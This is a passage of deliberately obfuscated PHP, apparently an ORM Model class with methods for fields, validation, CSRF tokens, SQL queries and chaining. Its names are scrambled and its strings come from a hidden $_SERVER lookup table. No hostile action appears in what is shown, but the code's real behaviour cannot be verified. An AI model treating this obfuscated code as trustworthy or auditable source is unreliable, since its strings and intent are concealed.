($this->_map as $áÆı¿¬ => $°øŸÃÈ) { if ($¹Â¾ƒŸÔ == 1) { if (isset($ÃÓŞã¥[$°øŸÃÈ])) { $ÃÓŞã¥[$áÆı¿¬] = $ÃÓŞã¥[$°øŸÃÈ]; unset($ÃÓŞã¥[$°øŸÃÈ]); } } else { if (isset($ÃÓŞã¥[$áÆı¿¬])) { $ÃÓŞã¥[$°øŸÃÈ] = $ÃÓŞã¥[$áÆı¿¬]; unset($ÃÓŞã¥[$áÆı¿¬]); } } } } return $ÃÓŞã¥; } public function setField($„†ÜØì®, $· ìÅÛ = '') { if (is_array($„†ÜØì®)) { $úŠğëø¬ = $„†ÜØì®; } else { $úŠğëø¬[$„†ÜØì®] = $· ìÅÛ; } return $this->save($úŠğëø¬); } public function setAdd($¼™šÂèÔ, $†ÒØ¦şè = 1) { $¹§¨¥ºÂ =& $_SERVER[Î‹ÃÂŞ„]; $ÒÕùœ¡ø = $¼™šÂèÔ . $¹§¨¥ºÂ[342] . $†ÒØ¦şè; if ($†ÒØ¦şè < 0) { $ÒÕùœ¡ø = $¼™šÂèÔ . $†ÒØ¦şè; } return $this->setField($¼™šÂèÔ, array($¹§¨¥ºÂ[343], $ÒÕùœ¡ø)); } public function getField($³¸†ò¡, $‹¬ÃŸ†ş = null) { $Àºè…‘ =& $_SERVER[Î‹ÃÂŞ„]; $Ãûö…ƒ[$Àºè…‘[319]] = $³¸†ò¡; $Ãûö…ƒ = $this->_parseOptions($Ãûö…ƒ); $³¸†ò¡ = trim($³¸†ò¡); if (strpos($³¸†ò¡, $Àºè…‘[50])) { if (!isset($Ãûö…ƒ[$Àºè…‘[338]])) { $Ãûö…ƒ[$Àºè…‘[338]] = is_numeric($‹¬ÃŸ†ş) ? $‹¬ÃŸ†ş : $Àºè…‘[12]; } $ÛÄÜ‚­¤ = $this->db->select($Ãûö…ƒ); if (!empty($ÛÄÜ‚­¤)) { $¡²«ìÒƒ = explode($Àºè…‘[50], $³¸†ò¡); $³¸†ò¡ = array_keys($ÛÄÜ‚­¤[0]); $ôÊğ¬à = array_shift($³¸†ò¡); $Ú¢Ôê’ = array_shift($³¸†ò¡); $óèùâáà = array(); $éÚ°÷ĞÎ = count($¡²«ìÒƒ); foreach ($ÛÄÜ‚­¤ as $ÕÑ²şá©) { $÷üÛ€âš = $ÕÑ²şá©[$ôÊğ¬à]; if (2 == $éÚ°÷ĞÎ) { $óèùâáà[$÷üÛ€âš] = $ÕÑ²şá©[$Ú¢Ôê’]; } else { $óèùâáà[$÷üÛ€âš] = is_string($‹¬ÃŸ†ş) ? implode($‹¬ÃŸ†ş, $ÕÑ²şá©) : $ÕÑ²şá©; } } return $óèùâáà; } } else { if (!0 !== $‹¬ÃŸ†ş) { $Ãûö…ƒ[$Àºè…‘[338]] = is_numeric($‹¬ÃŸ†ş) ? $‹¬ÃŸ†ş : 1; } if ($‹¬ÃŸ†ş === $Àºè…‘[301]) { unset($Ãûö…ƒ[$Àºè…‘[338]]); } $ÕÑ²şá© = $this->db->select($Ãûö…ƒ); if (!empty($ÕÑ²şá©)) { if ($‹¬ÃŸ†ş === $Àºè…‘[301]) { return reset($ÕÑ²şá©[0]); } if (!0 !== $‹¬ÃŸ†ş && 1 == $Ãûö…ƒ[$Àºè…‘[338]]) { return reset($ÕÑ²şá©[0]); } foreach ($ÕÑ²şá© as $Èö™Êöò) { $¹ÚŒ¨[] = $Èö™Êöò[$³¸†ò¡]; } return $¹ÚŒ¨; } } return null; } public function create($²çÜÍä = '', $Êú•°¡ = '') { $ì‡âìæ =& $_SERVER[Î‹ÃÂŞ„]; if (empty($²çÜÍä)) { $²çÜÍä = $_POST; } elseif (is_object($²çÜÍä)) { $²çÜÍä = get_object_vars($²çÜÍä); } if (empty($²çÜÍä) || !is_array($²çÜÍä)) { $this->error = think_lang($ì‡âìæ[317]); return !1; } $²çÜÍä = $this->parseFieldsMap($²çÜÍä, 0); $Êú•°¡ = $Êú•°¡ ? $Êú•°¡ : (!empty($²çÜÍä[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ì‡âìæ[319]])) { $ù çÇÏ = $this->options[$ì‡âìæ[319]]; unset($this->options[$ì‡âìæ[319]]); } elseif ($Êú•°¡ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ù çÇÏ = $this->insertFields; } elseif ($Êú•°¡ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ù çÇÏ = $this->updateFields; } if (isset($ù çÇÏ)) { if (is_string($ù çÇÏ)) { $ù çÇÏ = explode($ì‡âìæ[50], $ù çÇÏ); } if (think_config($ì‡âìæ[344])) { $ù çÇÏ[] = think_config($ì‡âìæ[345]); } foreach ($²çÜÍä as $ß·ÅĞˆ => $¬…Ì”ù¥) { if (!in_array($ß·ÅĞˆ, $ù çÇÏ)) { unset($²çÜÍä[$ß·ÅĞˆ]); } } } if (!$this->autoValidation($²çÜÍä, $Êú•°¡)) { return !1; } if (!$this->autoCheckToken($²çÜÍä)) { $this->error = think_lang($ì‡âìæ[346]); return !1; } if ($this->autoCheckFields) { $ù çÇÏ = $this->getDbFields(); foreach ($²çÜÍä as $ß·ÅĞˆ => $¬…Ì”ù¥) { if (!in_array($ß·ÅĞˆ, $ù çÇÏ)) { unset($²çÜÍä[$ß·ÅĞˆ]); } elseif (MAGIC_QUOTES_GPC && is_string($¬…Ì”ù¥)) { $²çÜÍä[$ß·ÅĞˆ] = stripslashes($¬…Ì”ù¥); } } } $this->autoOperation($²çÜÍä, $Êú•°¡); $this->data = $²çÜÍä; return $²çÜÍä; } public function autoCheckToken($ÓîÉ˜·á) { $€ˆÁÓˆ =& $_SERVER[Î‹ÃÂŞ„]; if (isset($this->options[$€ˆÁÓˆ[347]]) && !$this->options[$€ˆÁÓˆ[347]]) { return !0; } if (think_config($€ˆÁÓˆ[344])) { $¶ºú™ıÚ = think_config($€ˆÁÓˆ[345]); if (!isset($ÓîÉ˜·á[$¶ºú™ıÚ]) || Session::get($¶ºú™ıÚ)) { return !1; } list($ªëßó—î, $Ä™³Ò³¡) = explode($€ˆÁÓˆ[11], $ÓîÉ˜·á[$¶ºú™ıÚ]); if ($Ä™³Ò³¡ && Session::get($¶ºú™ıÚ . $€ˆÁÓˆ[10] . $ªëßó—î) === $Ä™³Ò³¡) { Session::remove($¶ºú™ıÚ . $€ˆÁÓˆ[10] . $ªëßó—î); return !0; } if (think_config($€ˆÁÓˆ[348])) { Session::remove($¶ºú™ıÚ . $€ˆÁÓˆ[10] . $ªëßó—î); } return !1; } return !0; } public function regex($«ò‰—± , $à‘Ìê¥¦) { $±—Õ¯Œâ =& $_SERVER[Î‹ÃÂŞ„]; $ŒŒ¶şÃâ = array($±—Õ¯Œâ[349] => $±—Õ¯Œâ[350], $±—Õ¯Œâ[351] => $±—Õ¯Œâ[352], $±—Õ¯Œâ[353] => $±—Õ¯Œâ[354], $±—Õ¯Œâ[355] => $±—Õ¯Œâ[356], $±—Õ¯Œâ[357] => $±—Õ¯Œâ[358], $±—Õ¯Œâ[359] => $±—Õ¯Œâ[360], $±—Õ¯Œâ[361] => $±—Õ¯Œâ[362], $±—Õ¯Œâ[336] => $±—Õ¯Œâ[363], $±—Õ¯Œâ[364] => $±—Õ¯Œâ[365]); if (isset($ŒŒ¶şÃâ[strtolower($à‘Ìê¥¦)])) { $à‘Ìê¥¦ = $ŒŒ¶şÃâ[strtolower($à‘Ìê¥¦)]; } return preg_match($à‘Ìê¥¦, $«ò‰—± ) === 1; } private function autoOperation(&$Ë‘ï ”×, $Œ°ŒÓ) { $á«¥¦şÓ =& $_SERVER[Î‹ÃÂŞ„]; if (!empty($this->options[$á«¥¦şÓ[366]])) { $™¸ßº± = $this->options[$á«¥¦şÓ[366]]; unset($this->options[$á«¥¦şÓ[366]]); } elseif (!empty($this->_auto)) { $™¸ßº± = $this->_auto; } if (isset($™¸ßº±)) { foreach ($™¸ßº± as $ƒ¢öÄÎÍ) { if (empty($ƒ¢öÄÎÍ[2])) { $ƒ¢öÄÎÍ[2] = THINK_MODEL_INSERT; } if ($Œ°ŒÓ == $ƒ¢öÄÎÍ[2] || $ƒ¢öÄÎÍ[2] == THINK_MODEL_BOTH) { switch (trim($ƒ¢öÄÎÍ[3])) { case $á«¥¦şÓ[367]: case $á«¥¦şÓ[368]: $£Õæ€¯ = isset($ƒ¢öÄÎÍ[4]) ? (array) $ƒ¢öÄÎÍ[4] : array(); if (isset($Ë‘ï ”×[$ƒ¢öÄÎÍ[0]])) { array_unshift($£Õæ€¯, $Ë‘ï ”×[$ƒ¢öÄÎÍ[0]]); } if ($á«¥¦şÓ[367] == $ƒ¢öÄÎÍ[3]) { $Ë‘ï ”×[$ƒ¢öÄÎÍ[0]] = call_user_func_array($ƒ¢öÄÎÍ[1], $£Õæ€¯); } else { $Ë‘ï ”×[$ƒ¢öÄÎÍ[0]] = call_user_func_array(array(&$this, $ƒ¢öÄÎÍ[1]), $£Õæ€¯); } break; case $á«¥¦şÓ[319]: $Ë‘ï ”×[$ƒ¢öÄÎÍ[0]] = $Ë‘ï ”×[$ƒ¢öÄÎÍ[1]]; break; case $á«¥¦şÓ[369]: if ($á«¥¦şÓ[12] === $Ë‘ï ”×[$ƒ¢öÄÎÍ[0]]) { unset($Ë‘ï ”×[$ƒ¢öÄÎÍ[0]]); } break; case $á«¥¦şÓ[370]: default: $Ë‘ï ”×[$ƒ¢öÄÎÍ[0]] = $ƒ¢öÄÎÍ[1]; } if (!1 === $Ë‘ï ”×[$ƒ¢öÄÎÍ[0]]) { unset($Ë‘ï ”×[$ƒ¢öÄÎÍ[0]]); } } } } return $Ë‘ï ”×; } protected function autoValidation($ÈüãåÉ×, $²áú­) { $Ìó”¢İĞ =& $_SERVER[Î‹ÃÂŞ„]; if (!empty($this->options[$Ìó”¢İĞ[371]])) { $äÅÃÃëù = $this->options[$Ìó”¢İĞ[371]]; unset($this->options[$Ìó”¢İĞ[371]]); } elseif (!empty($this->_validate)) { $äÅÃÃëù = $this->_validate; } if (isset($äÅÃÃëù)) { if ($this->patchValidate) { $this->error = array(); } foreach ($äÅÃÃëù as $É¾Åü¹× => $¿ì‚éÊ­) { if (empty($¿ì‚éÊ­[5]) || $¿ì‚éÊ­[5] == THINK_MODEL_BOTH || $¿ì‚éÊ­[5] == $²áú­) { if (0 == strpos($¿ì‚éÊ­[2], $Ìó”¢İĞ[372]) && strpos($¿ì‚éÊ­[2], $Ìó”¢İĞ[373])) { $¿ì‚éÊ­[2] = think_lang(substr($¿ì‚éÊ­[2], 2, -1)); } $¿ì‚éÊ­[3] = isset($¿ì‚éÊ­[3]) ? $¿ì‚éÊ­[3] : THINK_EXISTS_VALIDATE; $¿ì‚éÊ­[4] = isset($¿ì‚éÊ­[4]) ? $¿ì‚éÊ­[4] : $Ìó”¢İĞ[374]; switch ($¿ì‚éÊ­[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÈüãåÉ×, $¿ì‚éÊ­)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ìó”¢İĞ[12] != trim($ÈüãåÉ×[$¿ì‚éÊ­[0]])) { if (!1 === $this->_validationField($ÈüãåÉ×, $¿ì‚éÊ­)) { return !1; } } break; default: if (isset($ÈüãåÉ×[$¿ì‚éÊ­[0]])) { if (!1 === $this->_validationField($ÈüãåÉ×, $¿ì‚éÊ­)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÌĞ²ã, $¯ÚÖó) { if (!1 === $this->_validationFieldItem($ÌĞ²ã, $¯ÚÖó)) { if ($this->patchValidate) { $this->error[$¯ÚÖó[0]] = $¯ÚÖó[2]; } else { $this->error = $¯ÚÖó[2]; return !1; } } return; } protected function _validationFieldItem($±¯çÆº, $øó­æµÖ) { $£ôë =& $_SERVER[Î‹ÃÂŞ„]; switch (strtolower(trim($øó­æµÖ[4]))) { case $£ôë[367]: case $£ôë[368]: $ªÃğñÎ¬ = isset($øó­æµÖ[6]) ? (array) $øó­æµÖ[6] : array(); if (is_string($øó­æµÖ[0]) && strpos($øó­æµÖ[0], $£ôë[50])) { $øó­æµÖ[0] = explode($£ôë[50], $øó­æµÖ[0]); } if (is_array($øó­æµÖ[0])) { foreach ($øó­æµÖ[0] as $Âæ‹Ğİş) { $æ€ÜÅ†à[$Âæ‹Ğİş] = $±¯çÆº[$Âæ‹Ğİş]; } array_unshift($ªÃğñÎ¬, $æ€ÜÅ†à); } else { array_unshift($ªÃğñÎ¬, $±¯çÆº[$øó­æµÖ[0]]); } if ($£ôë[367] == $øó­æµÖ[4]) { return call_user_func_array($øó­æµÖ[1], $ªÃğñÎ¬); } else { return call_user_func_array(array(&$this, $øó­æµÖ[1]), $ªÃğñÎ¬); } case $£ôë[375]: return $±¯çÆº[$øó­æµÖ[0]] == $±¯çÆº[$øó­æµÖ[1]]; case $£ôë[376]: if (is_string($øó­æµÖ[0]) && strpos($øó­æµÖ[0], $£ôë[50])) { $øó­æµÖ[0] = explode($£ôë[50], $øó­æµÖ[0]); } $ï€ĞºñÃ = array(); if (is_array($øó­æµÖ[0])) { foreach ($øó­æµÖ[0] as $Âæ‹Ğİş) { $ï€ĞºñÃ[$Âæ‹Ğİş] = $±¯çÆº[$Âæ‹Ğİş]; } } else { $ï€ĞºñÃ[$øó­æµÖ[0]] = $±¯çÆº[$øó­æµÖ[0]]; } if (!empty($±¯çÆº[$this->getPk()])) { $ï€ĞºñÃ[$this->getPk()] = array($£ôë[377], $±¯çÆº[$this->getPk()]); } if ($this->where($ï€ĞºñÃ)->find()) { return !1; } return !0; default: return $this->check($±¯çÆº[$øó­æµÖ[0]], $øó­æµÖ[1], $øó­æµÖ[4]); } } public function check($òÙ“ºÆ¦, $¥¿Ûƒµş, $Íå§“Ò¹ = "\x72\x65\x67\145\x78") { $«»“²ß³ =& $_SERVER[Î‹ÃÂŞ„]; $Íå§“Ò¹ = strtolower(trim($Íå§“Ò¹)); switch ($Íå§“Ò¹) { case $«»“²ß³[7]: case $«»“²ß³[378]: $©Ÿ÷›¥À = is_array($¥¿Ûƒµş) ? $¥¿Ûƒµş : explode($«»“²ß³[50], $¥¿Ûƒµş); return $Íå§“Ò¹ == $«»“²ß³[7] ? in_array($òÙ“ºÆ¦, $©Ÿ÷›¥À) : !in_array($òÙ“ºÆ¦, $©Ÿ÷›¥À); case $«»“²ß³[379]: case $«»“²ß³[380]: if (is_array($¥¿Ûƒµş)) { $ûÓàö‡ë = $¥¿Ûƒµş[0]; $Ñ—’êÚÚ = $¥¿Ûƒµş[1]; } else { list($ûÓàö‡ë, $Ñ—’êÚÚ) = explode($«»“²ß³[50], $¥¿Ûƒµş); } return $Íå§“Ò¹ == $«»“²ß³[379] ? $òÙ“ºÆ¦ >= $ûÓàö‡ë && $òÙ“ºÆ¦ <= $Ñ—’êÚÚ : $òÙ“ºÆ¦ < $ûÓàö‡ë || $òÙ“ºÆ¦ > $Ñ—’êÚÚ; case $«»“²ß³[381]: case $«»“²ß³[382]: return $Íå§“Ò¹ == $«»“²ß³[381] ? $òÙ“ºÆ¦ == $¥¿Ûƒµş : $òÙ“ºÆ¦ != $¥¿Ûƒµş; case $«»“²ß³[383]: $ÍîÖ•…× = mb_strlen($òÙ“ºÆ¦, $«»“²ß³[384]); if (strpos($¥¿Ûƒµş, $«»“²ß³[50])) { list($ûÓàö‡ë, $Ñ—’êÚÚ) = explode($«»“²ß³[50], $¥¿Ûƒµş); return $ÍîÖ•…× >= $ûÓàö‡ë && $ÍîÖ•…× <= $Ñ—’êÚÚ; } else { return $ÍîÖ•…× == $¥¿Ûƒµş; } case $«»“²ß³[385]: list($ÆŠƒ«ˆ¢, $’¦è…†ù) = explode($«»“²ß³[50], $¥¿Ûƒµş); if (!is_numeric($ÆŠƒ«ˆ¢)) { $ÆŠƒ«ˆ¢ = strtotime($ÆŠƒ«ˆ¢); } if (!is_numeric($’¦è…†ù)) { $’¦è…†ù = strtotime($’¦è…†ù); } return NOW_TIME >= $ÆŠƒ«ˆ¢ && NOW_TIME <= $’¦è…†ù; case $«»“²ß³[386]: return in_array(get_client_ip(), explode($«»“²ß³[50], $¥¿Ûƒµş)); case $«»“²ß³[387]: return !in_array(get_client_ip(), explode($«»“²ß³[50], $¥¿Ûƒµş)); case $«»“²ß³[374]: default: return $this->regex($òÙ“ºÆ¦, $¥¿Ûƒµş); } } public function query($ÜØ„ä¤¹, $İâ†¢›ô = false) { $³ÓÂ²†© =& $_SERVER[Î‹ÃÂŞ„]; if (!is_bool($İâ†¢›ô) && !is_array($İâ†¢›ô)) { $İâ†¢›ô = func_get_args(); array_shift($İâ†¢›ô); } $ÜØ„ä¤¹ = str_replace(array($³ÓÂ²†©[248], $³ÓÂ²†©[388]), $³ÓÂ²†©[53], $ÜØ„ä¤¹); $ÜØ„ä¤¹ = $this->parseSql($ÜØ„ä¤¹, $İâ†¢›ô); return $this->db->query($ÜØ„ä¤¹); } public function execute($¿ÑÊ•Ó, $°úƒ¥äĞ = false) { if (!is_bool($°úƒ¥äĞ) && !is_array($°úƒ¥äĞ)) { $°úƒ¥äĞ = func_get_args(); array_shift($°úƒ¥äĞ); } $¿ÑÊ•Ó = $this->parseSql($¿ÑÊ•Ó, $°úƒ¥äĞ); return $this->db->execute($¿ÑÊ•Ó); } protected function parseSql($¢Ûç‘, $æ›Åğêè) { $Ù¶ˆø­³ =& $_SERVER[Î‹ÃÂŞ„]; if (!0 === $æ›Åğêè) { $ø…­¾š = $this->_parseOptions(); $¢Ûç‘ = $this->db->parseSql($¢Ûç‘, $ø…­¾š); } elseif (is_array($æ›Åğêè)) { $æ›Åğêè = array_map(array($this->db, $Ù¶ˆø­³[389]), $æ›Åğêè); $¢Ûç‘ = vsprintf($¢Ûç‘, $æ›Åğêè); } else { $¢Ûç‘ = strtr($¢Ûç‘, array($Ù¶ˆø­³[390] => $this->getTableName(), $Ù¶ˆø­³[391] => think_config($Ù¶ˆø­³[290]))); } $this->db->setModel($this->name); return $¢Ûç‘; } public function db($ÜÊÙ‰ÇÈ = '', $¯¥Ò­ó = '', $Û‘œùÍ§ = array()) { $˜ãÇï =& $_SERVER[Î‹ÃÂŞ„]; if ($˜ãÇï[12] === $ÜÊÙ‰ÇÈ && $this->db) { return $this->db; } static $™‡ÁµÆÕ = array(); static $°¾¢øˆ² = array(); if (!isset($°¾¢øˆ²[$ÜÊÙ‰ÇÈ]) || isset($°¾¢øˆ²[$ÜÊÙ‰ÇÈ]) && $¯¥Ò­ó && $™‡ÁµÆÕ[$ÜÊÙ‰ÇÈ] != $¯¥Ò­ó) { if (!empty($¯¥Ò­ó) && is_string($¯¥Ò­ó) && !1 === strpos($¯¥Ò­ó, $˜ãÇï[8])) { $¯¥Ò­ó = think_config($¯¥Ò­ó); } $ÜÊÙ‰ÇÈ = think_guid($¯¥Ò­ó); $°¾¢øˆ²[$ÜÊÙ‰ÇÈ] = Db::getInstance($¯¥Ò­ó); } elseif (NULL === $¯¥Ò­ó) { $°¾¢øˆ²[$ÜÊÙ‰ÇÈ]->close(); unset($°¾¢øˆ²[$ÜÊÙ‰ÇÈ]); return; } if (!empty($Û‘œùÍ§)) { if (is_string($Û‘œùÍ§)) { parse_str($Û‘œùÍ§, $Û‘œùÍ§); } foreach ($Û‘œùÍ§ as $÷·¬³ÛÎ => $½ïÙ¼§Û) { $this->setProperty($÷·¬³ÛÎ, $½ïÙ¼§Û); } } $™‡ÁµÆÕ[$ÜÊÙ‰ÇÈ] = $¯¥Ò­ó; $this->db = $°¾¢øˆ²[$ÜÊÙ‰ÇÈ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¯Ò¥àŒ = get_class($this); if ($¯Ò¥àŒ == $_SERVER[Î‹ÃÂŞ„][392]) { return $this->name; } $this->name = substr($¯Ò¥àŒ, 0, -5); } return $this->name; } public function getTableName() { $ÊÎ É±À =& $_SERVER[Î‹ÃÂŞ„]; if (empty($this->trueTableName)) { $¡£İÔº = !empty($this->tablePrefix) ? $this->tablePrefix : $ÊÎ É±À[12]; if (!empty($this->tableName)) { $¡£İÔº .= $this->tableName; } else { $¡£İÔº .= think_parse_name($this->name); } $this->trueTableName = strtolower($¡£İÔº); } return (!empty($this->dbName) ? $this->dbName . $ÊÎ É±À[10] : $ÊÎ É±À[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $µ…óÔÁ =& $_SERVER[Î‹ÃÂŞ„]; return isset($this->fields[$µ…óÔÁ[297]]) ? $this->fields[$µ…óÔÁ[297]] : $this->pk; } public function getDbFields() { $Î‘¶ˆş… =& $_SERVER[Î‹ÃÂŞ„]; if (isset($this->options[$Î‘¶ˆş…[325]])) { $¦Î®ï²ü = $this->db->getFields($this->options[$Î‘¶ˆş…[325]]); return $¦Î®ï²ü ? array_keys($¦Î®ï²ü) : !1; } if ($this->fields) { $¦Î®ï²ü = $this->fields; unset($¦Î®ï²ü[$Î‘¶ˆş…[296]], $¦Î®ï²ü[$Î‘¶ˆş…[297]], $¦Î®ï²ü[$Î‘¶ˆş…[298]], $¦Î®ï²ü[$Î‘¶ˆş…[295]]); return $¦Î®ï²ü; } return !1; } public function data($Ê’¾¤”ì = '') { $‡õúå‘² =& $_SERVER[Î‹ÃÂŞ„]; if ($‡õúå‘²[12] === $Ê’¾¤”ì && !empty($this->data)) { return $this->data; } if (is_object($Ê’¾¤”ì)) { $Ê’¾¤”ì = get_object_vars($Ê’¾¤”ì); } elseif (is_string($Ê’¾¤”ì)) { parse_str($Ê’¾¤”ì, $Ê’¾¤”ì); } elseif (!is_array($Ê’¾¤”ì)) { think_exception(think_lang($‡õúå‘²[317])); } $this->data = $Ê’¾¤”ì; return $this; } public function join($¯šÃ£ê ) { $ı®÷åòé =& $_SERVER[Î‹ÃÂŞ„]; if (is_array($¯šÃ£ê )) { $this->options[$ı®÷åòé[328]] = $¯šÃ£ê ; } elseif (!empty($¯šÃ£ê )) { $this->options[$ı®÷åòé[328]][] = $¯šÃ£ê ; } return $this; } public function union($À·˜¨«, $öü˜æ¦ = false) { $é÷‚ƒ‡ı =& $_SERVER[Î‹ÃÂŞ„]; if (empty($À·˜¨«)) { return $this; } if ($öü˜æ¦) { $this->options[$é÷‚ƒ‡ı[393]][$é÷‚ƒ‡ı[394]] = !0; } if (is_object($À·˜¨«)) { $À·˜¨« = get_object_vars($À·˜¨«); } if (is_string($À·˜¨«)) { $ÈñöÊó = $À·˜¨«; } elseif (is_array($À·˜¨«)) { if (isset($À·˜¨«[0])) { $this->options[$é÷‚ƒ‡ı[393]] = array_merge($this->options[$é÷‚ƒ‡ı[393]], $À·˜¨«); return $this; } else { $ÈñöÊó = $À·˜¨«; } } else { think_exception(think_lang($é÷‚ƒ‡ı[317])); } $this->options[$é÷‚ƒ‡ı[393]][] = $ÈñöÊó; return $this; } public function cache($Ìõ»†±¹ = true, $Á¥û¯•¿ = null, $¦¡õ¨Ù¾ = '') { $Ç¾ºş¨Ú =& $_SERVER[Î‹ÃÂŞ„]; if (!1 !== $Ìõ»†±¹) { $this->options[$Ç¾ºş¨Ú[395]] = array($Ç¾ºş¨Ú[96] => $Ìõ»†±¹, $Ç¾ºş¨Ú[385] => $Á¥û¯•¿, $Ç¾ºş¨Ú[33] => $¦¡õ¨Ù¾); } return $this; } public function field($¤¼å­éè, $á¹Ë„… = false) { $××ÔÊ÷“ =& $_SERVER[Î‹ÃÂŞ„]; if (!0 === $¤¼å­éè) { $’¡ØÎ¨ = $this->getDbFields(); $¤¼å­éè = $’¡ØÎ¨ ? $’¡ØÎ¨ : $××ÔÊ÷“[205]; } elseif ($á¹Ë„…) { if (is_string($¤¼å­éè)) { $¤¼å­éè = explode($××ÔÊ÷“[50], $¤¼å­éè); } $’¡ØÎ¨ = $this->getDbFields(); $¤¼å­éè = $’¡ØÎ¨ ? array_diff($’¡ØÎ¨, $¤¼å­éè) : $¤¼å­éè; } $this->options[$××ÔÊ÷“[319]] = $¤¼å­éè; return $this; } public function scope($½à™›é = '', $´¹µ¼ã— = NULL) { $¥Ë…äµ« =& $_SERVER[Î‹ÃÂŞ„]; if ($¥Ë…äµ«[12] === $½à™›é) { if (isset($this->_scope[$¥Ë…äµ«[37]])) { $éô¬²Ù‡ = $this->_scope[$¥Ë…äµ«[37]]; } else { return $this; } } elseif (is_string($½à™›é)) { $Šäëèæ² = explode($¥Ë…äµ«[50], $½à™›é); $éô¬²Ù‡ = array(); foreach ($Šäëèæ² as $¾ßÇö­¼) { if (!isset($this->_scope[$¾ßÇö­¼])) { continue; } $éô¬²Ù‡ = array_merge($éô¬²Ù‡, $this->_scope[$¾ßÇö­¼]); } if (!empty($´¹µ¼ã—) && is_array($´¹µ¼ã—)) { $éô¬²Ù‡ = array_merge($éô¬²Ù‡, $´¹µ¼ã—); } } elseif (is_array($½à™›é)) { $éô¬²Ù‡ = $½à™›é; } if (is_array($éô¬²Ù‡) && !empty($éô¬²Ù‡)) { $this->options = array_merge($this->options, array_change_key_case($éô¬²Ù‡)); } return $this; } public function where($ş—ŸÆı, $³¼à£ş = null) { $èµ€Ê¨ =& $_SERVER[Î‹ÃÂŞ„]; if (!is_null($³¼à£ş) && is_string($ş—ŸÆı)) { if (!is_array($³¼à£ş)) { $³¼à£ş = func_get_args(); array_shift($³¼à£ş); } $³¼à£ş = array_map(array($this->db, $èµ€Ê¨[389]), $³¼à£ş); $ş—ŸÆı = vsprintf($ş—ŸÆı, $³¼à£ş); } elseif (is_object($ş—ŸÆı)) { $ş—ŸÆı = get_object_vars($ş—ŸÆı); } elseif (is_array($ş—ŸÆı)) { foreach ($ş—ŸÆı as $ê—¸¡ˆ³ => $ñƒí‡©) { if ((is_numeric($ê—¸¡ˆ³) || !$ê—¸¡ˆ³) && is_string($ñƒí‡©)) { if (strpos($ñƒí‡©, $èµ€Ê¨[396]) === 0) { continue; } think_trace($èµ€Ê¨[397], $èµ€Ê¨[12], $èµ€Ê¨[49]); die; } } } if (is_string($ş—ŸÆı) && $èµ€Ê¨[12] != $ş—ŸÆı) { $Âòİ”¨ = array(); $Âòİ”¨[$èµ€Ê¨[398]] = $ş—ŸÆı; $ş—ŸÆı = $Âòİ”¨; } if (isset($this->options[$èµ€Ê¨[321]])) { $this->options[$èµ€Ê¨[321]] = array_merge($this->options[$èµ€Ê¨[321]], $ş—ŸÆı); } else { $this->options[$èµ€Ê¨[321]] = $ş—ŸÆı; } return $this; } public function limit($¡ßˆ¡Øº, $…Ü¤ã€ = null) { $ÍòäŠâ· =& $_SERVER[Î‹ÃÂŞ„]; $this->options[$ÍòäŠâ·[338]] = is_null($…Ü¤ã€) ? $¡ßˆ¡Øº : $¡ßˆ¡Øº . $ÍòäŠâ·[50] . $…Ü¤ã€; return $this; } public function page($ç¹İ²¶¢, $›îâ¯´ = null) { $£×Û“¹Ô =& $_SERVER[Î‹ÃÂŞ„]; $this->options[$£×Û“¹Ô[399]] = is_null($›îâ¯´) ? $ç¹İ²¶¢ : $ç¹İ²¶¢ . $£×Û“¹Ô[50] . $›îâ¯´; return $this; } public function comment($„åÜŒùÜ) { $this->options[$_SERVER[Î‹ÃÂŞ„][400]] = $„åÜŒùÜ; return $this; } public function setProperty($®š¦«ˆ, $±¾İúßø) { if (property_exists($this, $®š¦«ˆ)) { $this->{$®š¦«ˆ} = $±¾İúßø; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\124\x69\x6d\x65", "\164\x69\155\145", "\x69\156\x73\x65\x72\x74\x2c\x75\160\x64\141\164\x65", "\146\x75\156\143\x74\151\157\156"), array("\x63\162\x65\141\x74\145\124\151\x6d\145", "\164\151\155\145", "\151\156\x73\145\162\164", "\x66\165\156\x63\164\x69\x6f\x6e")); public function setDataAuto($êé’ü•â) { $this->dataAuto = $êé’ü•â; } public function __construct($¥à‰¤¸ = '', $üğÂ„êÌ = '', $çô‘ë¨í = '') { parent::__construct($¥à‰¤¸, $üğÂ„êÌ, $çô‘ë¨í); } protected $tableMeta = array(); protected function _beforeInsert(&$ÁÕÒÆñ, $ö©¥‹Ö‡) { $æ­á°àÖ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->checkDataAutoHas($æ­á°àÖ[401])) { return; } $this->dataBeforeFilter($ÁÕÒÆñ, $æ­á°àÖ[401]); } protected function _beforeUpdate(&$èÜ÷Ÿë©, $¥Ò“¾Ïğ) { $Ûø’Ê =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->checkDataAutoHas($Ûø’Ê[402])) { return; } $this->dataBeforeFilter($èÜ÷Ÿë©, $Ûø’Ê[402]); } protected function _afterSelect(&$Õ“ƒĞ¤î, $’‹ÛÎŸã) { if (!is_array($Õ“ƒĞ¤î)) { return; } if (!$this->checkDataAutoHas($_SERVER[Î‹ÃÂŞ„][403])) { return; } foreach ($Õ“ƒĞ¤î as &$œÍµ÷—) { $this->dataAfterFilter($œÍµ÷—); } unset($œÍµ÷—); } protected function _afterFind(&$¦£Ÿ²ùê, $ËŸ¥İè¾) { if (!is_array($¦£Ÿ²ùê)) { return; } if (!$this->checkDataAutoHas($_SERVER[Î‹ÃÂŞ„][403])) { return; } $this->dataAfterFilter($¦£Ÿ²ùê); } public static function textEncode($´‹í«ã) { if (!$´‹í«ã) 